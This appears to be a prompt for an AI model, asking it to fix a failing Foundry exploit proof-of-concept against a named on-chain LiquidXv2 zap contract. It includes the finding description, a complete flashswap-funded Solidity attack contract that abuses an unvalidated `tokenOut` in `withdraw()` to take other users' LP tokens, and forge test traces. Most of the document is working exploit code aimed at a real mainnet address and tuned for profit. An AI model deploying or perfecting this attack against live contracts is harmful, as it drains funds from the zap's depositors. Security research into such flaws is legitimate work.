You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Arbitrary `tokenOut` lets withdrawers steal unrelated tokens held by the zap
- claim: `withdraw()` only uses `tokenOut` to decide whether to consolidate into `token1`; otherwise it consolidates into `token0`, but it still transfers `IERC20(tokenOut)` at the end without validating that the contract actually holds the withdrawn proceeds in that asset. A caller can therefore request any ERC20 currently held by the zap instead of the asset produced by the withdrawal.
- impact: Any user with a withdrawable LP position can drain unrelated balances from the contract. Because nonzero `basketId` deposits keep LP tokens in the zap and only update internal bookkeeping, an attacker can withdraw a small position while setting `tokenOut` to the pair LP token and steal other users' basket-backed LP. The real withdrawal proceeds remain stranded in the contract, leaving basket accounting undercollateralized.
- exploit_paths: ["Basket users deposit with `basketId != 0`, so LP tokens stay in the zap balance and only `balanceOf[account][pair][basketId]` is incremented.", "An attacker obtains a small withdrawable position for the same pair.", "The attacker calls `withdraw(attacker, token0, token1, amount, pair, basketId, address(0), emptyPath, ...)`.", "`withdraw()` removes liquidity and recombines into `token0`/`token1`, but the final transfer sends `IERC20(pair)` from the contract's shared balance to the attacker."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRouterLike {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IFactoryAllPairs {
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256 index) external view returns (address);
}

interface IPair is IERC20 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ISwapPlusStructs {
    struct SwapRouter {
        string platform;
        address tokenIn;
        address tokenOut;
        uint256 amountOutMin;
        uint256 meta;
        uint256 percent;
    }

    struct SwapLine {
        SwapRouter[] swaps;
    }

    struct SwapBlock {
        SwapLine[] lines;
    }

    struct SwapPath {
        SwapBlock[] path;
    }
}

interface ILiquidXv2Zap is ISwapPlusStructs {
    function router() external view returns (address);
    function factory() external view returns (address);

    function deposit(
        address account,
        address token,
        address tokenM,
        SwapPath calldata path,
        address token0,
        address token1,
        uint256[3] calldata amount,
        uint256 basketId
    ) external payable returns (uint256);

    function withdraw(
        address account,
        address token0,
        address token1,
        uint256 amount,
        address tokenOut,
        uint256 basketId,
        address tokenM,
        SwapPath calldata wpath,
        uint256[3] calldata amountMin
    ) external returns (uint256);
}

contract FlawVerifier is ISwapPlusStructs {
    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    address public exploitPair;
    address public exploitToken0;
    address public exploitToken1;
    uint256 public seedCapitalUsed;
    uint256 public stolenAmount;

    struct PairState {
        address pair;
        address token0;
        address token1;
        uint256 reserve0;
        uint256 reserve1;
        uint256 supply;
        uint256 zapLpBalance;
    }

    struct Plan {
        address pair;
        address token0;
        address token1;
        uint256 capitalAmount;
        uint256 burnLp;
        uint256 previewStealLp;
        uint256 previewRepayLp;
        uint256 previewProfitLp;
    }

    struct AttemptContext {
        address pair;
        address token0;
        address token1;
        uint256 capitalAmount;
        uint256 burnLp;
    }

    AttemptContext private _attempt;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
        address factory = zap.factory();
        uint256 pairCount = _allPairsLength(factory);
        if (pairCount == 0) {
            return;
        }

        for (uint256 i = 0; i < pairCount; ++i) {
            address pair = _allPairs(factory, i);
            if (pair == address(0)) {
                continue;
            }

            PairState memory state = _loadPairState(pair);
            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
                continue;
            }

            if (state.zapLpBalance == 0) {
                continue;
            }

            if (_attemptPair(state)) {
                return;
            }
        }
    }

    function attemptFlash(Plan calldata plan) external returns (bool) {
        require(msg.sender == address(this), "self only");

        _attempt = AttemptContext({
            pair: plan.pair,
            token0: plan.token0,
            token1: plan.token1,
            capitalAmount: plan.capitalAmount,
            burnLp: plan.burnLp
        });

        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
        return _profitAmount > 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    receive() external payable {}

    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        require(msg.sender == _attempt.pair, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");

        uint256 lpBefore = IERC20(_attempt.pair).balanceOf(address(this));

        // exploit_paths[0]: basket users deposited with `basketId != 0`, so LP tokens
        // remain parked in the zap's shared pair balance. This verifier only targets
        // pairs where that pre-existing zap LP inventory is already present on-chain.

        // exploit_paths[1]: the attacker obtains a small, real withdrawable position for
        // the same pair. Flashswap funding only replaces upfront capital; it does not
        // change the exploit causality or the assets used by the vulnerable withdraw.
        uint256 mintedLp = _seedWithdrawablePosition(_attempt.capitalAmount);
        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");

        // exploit_paths[2]: call `withdraw()` on that legitimate LP position while
        // setting `tokenOut` to the pair LP token itself.
        _stealBasketBackedLp(_attempt.burnLp);

        // exploit_paths[3]: `withdraw()` burns the legitimate LP position into token0 /
        // token1, but its final unchecked transfer sends `IERC20(pair)` from the zap's
        // shared balance to the attacker.
        uint256 stolenLp = IERC20(_attempt.pair).balanceOf(address(this)) - lpBefore;
        require(stolenLp > 0, "no stolen LP");

        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
        _repayFlashswapWithStolenLp(stolenLp, amountOwed);
        _forceTransfer(_attempt.token0, _attempt.pair, amountOwed);

        _profitToken = _attempt.pair;
        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
        require(_profitAmount > 0, "zero profit");

        hypothesisValidated = true;
        exploitPair = _attempt.pair;
        exploitToken0 = _attempt.token0;
        exploitToken1 = _attempt.token1;
        seedCapitalUsed = _attempt.capitalAmount;
        stolenAmount = stolenLp;
    }

    function _seedWithdrawablePosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
        _forceApprove(_attempt.token0, TARGET, capitalAmount);

        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
        SwapPath memory emptyPath = _emptyPath();
        mintedLp = ILiquidXv2Zap(TARGET).deposit(
            address(this),
            _attempt.token0,
            address(0),
            emptyPath,
            _attempt.token0,
            _attempt.token1,
            depositAmounts,
            0
        );
    }

    function _stealBasketBackedLp(uint256 burnLp) internal {
        _forceApprove(_attempt.pair, TARGET, burnLp);

        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
        SwapPath memory emptyPath = _emptyPath();
        ILiquidXv2Zap(TARGET).withdraw(
            address(this),
            _attempt.token0,
            _attempt.token1,
            burnLp,
            _attempt.pair,
            0,
            address(0),
            emptyPath,
            amountMins
        );
    }

    function _repayFlashswapWithStolenLp(uint256 stolenLp, uint256 amountOwed) internal {
        address router = ILiquidXv2Zap(TARGET).router();

        (uint112 reserve0, uint112 reserve1, ) = IPair(_attempt.pair).getReserves();
        uint256 supply = IPair(_attempt.pair).totalSupply();
        uint256 repayLp = _minLpForToken0(
            amountOwed,
            uint256(reserve0),
            uint256(reserve1),
            supply,
            stolenLp
        );
        require(repayLp < stolenLp, "not profitable");

        _forceApprove(_attempt.pair, router, repayLp);
        IRouterLike(router).removeLiquidity(
            _attempt.token0,
            _attempt.token1,
            repayLp,
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
        if (token1Balance > 0) {
            _forceApprove(_attempt.token1, router, token1Balance);
            address[] memory path = new address[](2);
            path[0] = _attempt.token1;
            path[1] = _attempt.token0;
            IRouterLike(router).swapExactTokensForTokens(
                token1Balance,
                0,
                path,
                address(this),
                block.timestamp
            );
        }

        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "repayment shortfall");
    }

    function _buildPlan(PairState memory state) internal pure returns (Plan memory best) {
        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
        if (maxBurnLp == 0) {
            return best;
        }

        uint256[7] memory sampleLp;
        sampleLp[0] = maxBurnLp / 64;
        sampleLp[1] = maxBurnLp / 32;
        sampleLp[2] = maxBurnLp / 16;
        sampleLp[3] = maxBurnLp / 8;
        sampleLp[4] = maxBurnLp / 4;
        sampleLp[5] = maxBurnLp / 2;
        sampleLp[6] = maxBurnLp;

        for (uint256 i = 0; i < sampleLp.length; ++i) {
            Plan memory candidate = _planForSample(state, sampleLp[i]);
            if (candidate.previewProfitLp > best.previewProfitLp) {
                best = candidate;
            }
        }
    }

    function _attemptPair(PairState memory state) internal returns (bool) {
        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
        if (maxBurnLp == 0) {
            return false;
        }

        uint256[7] memory sampleLp;
        sampleLp[0] = maxBurnLp;
        sampleLp[1] = maxBurnLp / 2;
        sampleLp[2] = maxBurnLp / 4;
        sampleLp[3] = maxBurnLp / 8;
        sampleLp[4] = maxBurnLp / 16;
        sampleLp[5] = maxBurnLp / 32;
        sampleLp[6] = maxBurnLp / 64;

        for (uint256 i = 0; i < sampleLp.length; ++i) {
            Plan memory candidate = _planForSample(state, sampleLp[i]);
            if (candidate.previewProfitLp == 0) {
                continue;
            }

            try this.attemptFlash(candidate) returns (bool ok) {
                if (ok) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
        if (burnLp == 0) {
            return plan;
        }

        uint256 previewStealLp = _consolidatedToToken0(burnLp, state.reserve0, state.reserve1, state.supply);
        if (previewStealLp == 0 || previewStealLp > state.zapLpBalance) {
            return plan;
        }

        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, state.reserve0, state.reserve1, state.supply);
        if (capitalAmount == 0 || capitalAmount >= state.reserve0) {
            return plan;
        }

        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
        uint256 previewRepayLp = _minLpForToken0(
            amountOwed,
            state.reserve0,
            state.reserve1,
            state.supply,
            previewStealLp
        );
        if (previewRepayLp == 0 || previewRepayLp >= previewStealLp) {
            return plan;
        }

        plan = Plan({
            pair: state.pair,
            token0: state.token0,
            token1: state.token1,
            capitalAmount: capitalAmount,
            burnLp: burnLp,
            previewStealLp: previewStealLp,
            previewRepayLp: previewRepayLp,
            previewProfitLp: previewStealLp - previewRepayLp
        });
    }

    function _loadPairState(address pair) internal view returns (PairState memory state) {
        state.pair = pair;
        state.token0 = IPair(pair).token0();
        state.token1 = IPair(pair).token1();
        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
        state.reserve0 = uint256(reserve0);
        state.reserve1 = uint256(reserve1);
        state.supply = IPair(pair).totalSupply();
        state.zapLpBalance = IERC20(pair).balanceOf(TARGET);
    }

    function _emptyPath() internal pure returns (SwapPath memory path) {
        path.path = new SwapBlock[](0);
    }

    function _allPairsLength(address factory) internal view returns (uint256 count) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector)
        );
        if (ok && data.length >= 32) {
            count = abi.decode(data, (uint256));
        }
    }

    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _maxLpForStealCap(
        uint256 stealCapLp,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (supply <= 1) {
            return 0;
        }

        uint256 low = 0;
        uint256 high = supply - 1;
        while (low < high) {
            uint256 mid = (low + high + 1) >> 1;
            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCapLp) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _minLpForToken0(
        uint256 token0Needed,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply,
        uint256 upperBoundLp
    ) internal pure returns (uint256) {
        if (token0Needed == 0 || upperBoundLp == 0) {
            return 0;
        }

        uint256 low = 1;
        uint256 high = upperBoundLp;
        while (low < high) {
            uint256 mid = (low + high) >> 1;
            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) >= token0Needed) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        return low;
    }

    function _minToken0ForMintedLp(
        uint256 lpTarget,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (lpTarget == 0 || reserve0 <= 1) {
            return 0;
        }

        uint256 low = 1;
        uint256 high = reserve0 - 1;
        if (_previewOneSidedMintToken0(high, reserve0, reserve1, supply) < lpTarget) {
            return 0;
        }

        while (low < high) {
            uint256 mid = (low + high) >> 1;
            if (_previewOneSidedMintToken0(mid, reserve0, reserve1, supply) >= lpTarget) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        return low;
    }

    function _previewOneSidedMintToken0(
        uint256 amountIn,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (amountIn == 0 || reserve0 == 0 || reserve1 == 0 || supply == 0) {
            return 0;
        }

        uint256 swapAmount = _calculateSwapAmount(reserve0, amountIn);
        if (swapAmount == 0 || swapAmount >= amountIn) {
            return 0;
        }

        uint256 amount1Out = _getAmountOut(swapAmount, reserve0, reserve1);
        if (amount1Out == 0 || amount1Out >= reserve1) {
            return 0;
        }

        uint256 remaining0 = amountIn - swapAmount;
        uint256 postSwapReserve0 = reserve0 + swapAmount;
        uint256 postSwapReserve1 = reserve1 - amount1Out;
        if (postSwapReserve0 == 0 || postSwapReserve1 == 0) {
            return 0;
        }

        uint256 lpFrom0 = (remaining0 * supply) / postSwapReserve0;
        uint256 lpFrom1 = (amount1Out * supply) / postSwapReserve1;
        return lpFrom0 < lpFrom1 ? lpFrom0 : lpFrom1;
    }

    function _consolidatedToToken0(
        uint256 lpAmount,
        uint256 reserve0,
        uint256 reserve1,
        uint256 supply
    ) internal pure returns (uint256) {
        if (lpAmount == 0 || supply == 0) {
            return 0;
        }

        uint256 amount0 = (reserve0 * lpAmount) / supply;
        uint256 amount1 = (reserve1 * lpAmount) / supply;
        if (amount0 == 0 && amount1 == 0) {
            return 0;
        }

        if (amount0 >= reserve0 || amount1 >= reserve1) {
            return 0;
        }

        uint256 postReserve0 = reserve0 - amount0;
        uint256 postReserve1 = reserve1 - amount1;
        uint256 swapped = _getAmountOut(amount1, postReserve1, postReserve0);
        return amount0 + swapped;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _calculateSwapAmount(uint256 reserve, uint256 inAmount) internal pure returns (uint256) {
        if (reserve == 0 || inAmount == 0) {
            return 0;
        }
        uint256 a1 = reserve * reserve * 1997 * 1997;
        uint256 a2 = 4 * 997 * reserve * inAmount * 1000;
        return (_sqrt(a1 + a2) - (reserve * 1997)) / (2 * 997);
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 current = IERC20(token).allowance(address(this), spender);
        if (current >= amount) {
            return;
        }
        if (current != 0) {
            _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        }
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, type(uint256).max));
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length > 0) {
            require(abi.decode(returnData, (bool)), "token op returned false");
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.91s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 125175)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [125175] FlawVerifierTest::testExploit()
    ├─ [2479] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [96169] FlawVerifier::executeOnOpportunity()
    │   ├─ [2382] 0x364f17A23AE4350319b7491224d10dF5796190bC::factory() [staticcall]
    │   │   └─ ← [Return] 0xBC7D212939FBe696e514226F3FAfA3697B96Bf59
    │   ├─ [2348] 0xBC7D212939FBe696e514226F3FAfA3697B96Bf59::allPairsLength() [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [2648] 0xBC7D212939FBe696e514226F3FAfA3697B96Bf59::allPairs(0) [staticcall]
    │   │   └─ ← [Return] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A
    │   ├─ [2449] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A::token0() [staticcall]
    │   │   └─ ← [Return] 0x872952d3c1Caf944852c5ADDa65633F1Ef218A26
    │   ├─ [2381] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2526] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A::getReserves() [staticcall]
    │   │   └─ ← [Return] 83432257304898317286160 [8.343e22], 4874210243369507303 [4.874e18], 1706816039 [1.706e9]
    │   ├─ [2429] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A::totalSupply() [staticcall]
    │   │   └─ ← [Return] 632559594044305437698 [6.325e20]
    │   ├─ [2581] 0x1884C3D0ac1A3ACF0698b2a19866cee4cE27c31A::balanceOf(0x364f17A23AE4350319b7491224d10dF5796190bC) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2648] 0xBC7D212939FBe696e514226F3FAfA3697B96Bf59::allPairs(1) [staticcall]
    │   │   └─ ← [Return] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3
    │   ├─ [2449] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3::token0() [staticcall]
    │   │   └─ ← [Return] 0x872952d3c1Caf944852c5ADDa65633F1Ef218A26
    │   ├─ [2381] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3::token1() [staticcall]
    │   │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    │   ├─ [2526] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3::getReserves() [staticcall]
    │   │   └─ ← [Return] 3162277661 [3.162e9], 1, 1703830895 [1.703e9]
    │   ├─ [2429] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000
    │   ├─ [2581] 0xa4A63F7D736c6C631cbE8C9D5c30f173D158d3C3::balanceOf(0x364f17A23AE4350319b7491224d10dF5796190bC) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2648] 0xBC7D212939FBe696e514226F3FAfA3697B96Bf59::allPairs(2) [staticcall]
    │   │   └─ ← [Return] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768
    │   ├─ [2449] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768::token0() [staticcall]
    │   │   └─ ← [Return] 0xAb7042E62C3938881edade82108b03036B1A959c
    │   ├─ [2381] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768::token1() [staticcall]
    │   │   └─ ← [Return] 0xBB9Ec0f4D8d3585c0B30366928aff77fd90C9b59
    │   ├─ [2526] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768::getReserves() [staticcall]
    │   │   └─ ← [Return] 100000002000000000000000000 [1e26], 100000001000000000000000000 [1e26], 1704863447 [1.704e9]
    │   ├─ [2429] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   ├─ [2581] 0x96519226955eA0DE933E450c88F6C1D9CcAD6768::balanceOf(0x364f17A23AE4350319b7491224d10dF5796190bC) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [479] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2500] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.69s (1.66s CPU time)

Ran 1 test suite in 1.69s (1.69s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 125175)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
